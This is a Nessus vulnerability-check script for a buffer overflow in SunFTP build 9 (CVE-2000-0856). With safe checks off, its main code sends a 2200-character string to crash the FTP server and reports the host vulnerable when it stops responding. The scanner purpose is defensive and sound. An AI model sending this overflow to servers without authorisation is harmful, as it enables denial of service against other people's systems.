#
# This script was written by Xue Yong Zhi <xueyong@udel.edu>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11373);
 script_bugtraq_id(1638);
 script_version ("$Revision: 1.5 $");
 script_cve_id("CVE-2000-0856");
 name["english"] = "SunFTP Buffer Overflow";

 script_name(english:name["english"]);

 desc["english"] = "
Buffer overflow in SunFTP build 9(1) allows remote attackers to cause
a denial of service or possibly execute arbitrary commands by sending
more than 2100 characters to the server.

Solution : Switching to another FTP server, SunFTP is discontinued.


Risk factor : High";


 script_description(english:desc["english"]);


 script_summary(english:"Checks if the remote SunFTP can be buffer overflown",
 		francais:"Détermine si le serveur SunFTP distant peut etre soumis a un dépassement de buffer");
 script_category(ACT_MIXED_ATTACK); 
 script_family(english:"FTP");


 script_copyright(english:"This script is Copyright (C) 2003 Xue Yong Zhi",
 		  francais:"Ce script est Copyright (C) 2003 Xue Yong Zhi");

 script_dependencie("ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here :
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

if(safe_checks())
{
 banner = get_ftp_banner(port: port);
 if(banner)
 {
  if("SunFTP b9"><banner) {
    desc = "
Buffer overflow in SunFTP build 9(1) allows remote attackers to cause
a denial of service or possibly execute arbitrary commands by sending
more than 2100 characters to the server.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : Switching to another FTP server, SunFTP is discontinued.


Risk factor : High";

  security_hole(port:port, data:desc);
  }
 }

 exit(0);
}


# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
  # make sure the FTP server exists
  send(socket:soc, data:string("help\r\n"));
  b = ftp_recv_line(socket:soc);
  if(!b)exit(0);
  if("SunFTP" >!< b)exit(0);
  close(soc);
  
  soc = open_sock_tcp(port);
  longstring=string(crap(2200));
  send(socket:soc, data:string(longstring, "\r\n"));
  b = ftp_recv_line(socket:soc);
  if(!b){
	security_hole(port);
	exit(0);
  } else {
	ftp_close(socket:soc);
  }
}
